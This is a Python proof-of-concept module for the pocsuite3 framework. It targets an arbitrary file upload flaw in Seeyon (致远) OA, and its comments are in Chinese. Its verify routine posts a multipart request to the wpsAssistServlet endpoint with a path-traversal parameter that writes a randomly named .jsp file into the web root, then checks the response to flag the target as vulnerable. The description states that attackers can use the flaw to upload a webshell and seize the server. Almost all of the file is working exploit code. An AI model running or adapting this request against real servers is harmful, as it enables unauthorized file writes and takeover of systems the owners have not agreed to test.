from pocsuite3.api import Output, POCBase, register_poc, requests, logger, VUL_TYPE, POC_CATEGORY, OptDict
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD
from pocsuite3.lib.utils import random_str
from collections import OrderedDict
import base64,random
class DemoPOC(POCBase):
    vulID = '000'  # ssvid
    version = '1.0'
    name = '致远OA任意文件上传'
    appName = '致远OA'
    appVersion = 'All'
    vulType = VUL_TYPE.CODE_EXECUTION
    desc = '''2022攻防演习期间，致远OA被曝存在任意文件上传漏洞，攻击者可以利用漏洞直接上传webshell获取服务器权限。'''
    samples = []
    install_requires = ['']
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    def _verify(self):#验证模式
        file = random_str()
        file = file+".jsp"
        result = {}
        target = self.url+"/seeyon/wpsAssistServlet?flag=save&realFileType=/../../../ApacheJetspeed/webapps/ROOT/"+file+"&fileId=1"
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0)',
            'Content-Type': 'multipart/form-data; boundary=6868308b823f9949713513295ecf315579ee350a1a85c22fe1905a078fb4',
            'Accept-Encoding': 'gzip',
        }
        data = '''--6868308b823f9949713513295ecf315579ee350a1a85c22fe1905a078fb4
Content-Disposition: form-data; name="upload"; filename="deC08B.txt"
Content-Type: application/octet-stream

12345
--6868308b823f9949713513295ecf315579ee350a1a85c22fe1905a078fb4--'''
        try:
            r = requests.post(url=target,data=data,headers=headers,timeout=8,verify=False)
            print(r.text)
            if r.status_code == 200 and "\"success\":false}" in r.text:
                result['verifyInfo'] = {}
                result['verifyInfo']['URL'] = target
                result['verifyInfo']['Path'] = self.url+"/"+file
                return self.parse_output(result)
        except:
            pass

    def parse_output(self,result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
register_poc(DemoPOC)